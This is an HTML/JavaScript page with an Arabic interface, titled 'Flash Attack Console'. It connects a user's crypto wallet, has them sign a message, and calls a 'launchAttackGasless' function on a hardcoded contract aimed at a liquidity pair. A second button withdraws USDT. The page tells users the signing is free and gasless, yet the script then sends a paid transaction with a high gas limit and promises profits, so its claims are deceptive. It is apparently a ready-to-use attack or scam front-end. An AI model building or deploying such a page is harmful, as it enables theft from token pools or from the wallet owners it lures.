<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Flash Attack Console - V2</title>
    <style>
        body { background: #030a09; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 360px; background: #0a1412; border-radius: 20px; padding: 25px; text-align: center; border: 1px solid #1a2e2a; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { width: 100%; padding: 16px; background: #00ffa3; color: #000; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.3s; }
        .btn:hover { background: #00cc82; transform: scale(1.02); }
        input { width: 100%; padding: 12px; background: #142622; color: white; border: 1px solid #253d38; border-radius: 8px; margin: 8px 0; box-sizing: border-box; text-align: center; }
        #status { margin-top: 20px; font-size: 14px; color: #708581; min-height: 40px; }
        .label { font-size: 12px; color: #00ffa3; text-align: right; width: 100%; display: block; margin-top: 5px; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="margin-bottom: 5px;">⚡ Flash Console</h2>
    <p style="font-size: 12px; color: #708581; margin-bottom: 20px;">نظام التوقيع الرقمي (Gasless Mode)</p>
    
    <span class="label">عنوان الزوج (Pair):</span>
    <input type="text" id="pair" placeholder="0x..." value="0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE">
    
    <span class="label">المبلغ المطلوب (بالـ Wei):</span>
    <input type="text" id="amount" placeholder="5000000000000000000000" value="5000000000000000000000">

    <button class="btn" onclick="attack()">توقيع وتنفيذ الهجوم</button>
    <button class="btn" style="background:#ffcc00;" onclick="withdraw()">سحب الأرباح للمحفظة</button>
    
    <div id="status">جاهز للتنفيذ...</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
    const CONTRACT_ADDR = "0xE16096AF27Ca3123d4e8e127Bf9A6a271fbF3e9a";
    
    const ABI = [
        {"inputs":[{"name":"_pair","type":"address"},{"name":"_amount","type":"uint256"},{"name":"_nonce","type":"uint256"},{"name":"_signature","type":"bytes"}],"name":"launchAttackGasless","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"name":"_token","type":"address"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}
    ];

    async function attack() {
        const status = document.getElementById('status');
        try {
            if (!window.ethereum) return alert("يرجى فتح الصفحة من داخل Trust Wallet أو MetaMask");
            const web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            const pair = document.getElementById('pair').value;
            const amount = document.getElementById('amount').value;
            const nonce = Math.floor(Math.random() * 999999);

            status.innerText = "بانتظار التوقيع الرقمي (مجاني)...";

            // إنشاء الـ Hash للتوقيع
            const messageHash = web3.utils.soliditySha3(
                {t: 'address', v: pair},
                {t: 'uint256', v: amount},
                {t: 'uint256', v: nonce}
            );

            // طلب التوقيع من المستخدم (هذه الخطوة لا تستهلك غاز)
            const signature = await web3.eth.personal.sign(messageHash, accounts[0]);

            status.innerText = "تم التوقيع! جارٍ إرسال الأمر للعقد...";

            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            
            // إرسال المعاملة النهائية مع التوقيع
            await contract.methods.launchAttackGasless(pair, amount, nonce, signature).send({ 
                from: accounts[0],
                gas: 3000000 // رفع حد الغاز لضمان النجاح
            });

            status.innerHTML = "<b style='color:#00ffa3;'>✅ نجحت العملية! اضغط سحب الآن.</b>";
        } catch (e) {
            status.innerText = "خطأ: " + e.message;
        }
    }

    async function withdraw() {
        const status = document.getElementById('status');
        try {
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const USDT = "0x55d398326f99059fF775485246999027B3197955";

            status.innerText = "جارٍ سحب الأرباح...";
            await contract.methods.withdraw(USDT).send({ from: accounts[0] });
            status.innerHTML = "<b style='color:#00ffa3;'>💰 وصلت الأموال لمحفظتك!</b>";
        } catch (e) {
            status.innerText = "فشل السحب: " + e.message;
        }
    }
</script>
</body>
</html>
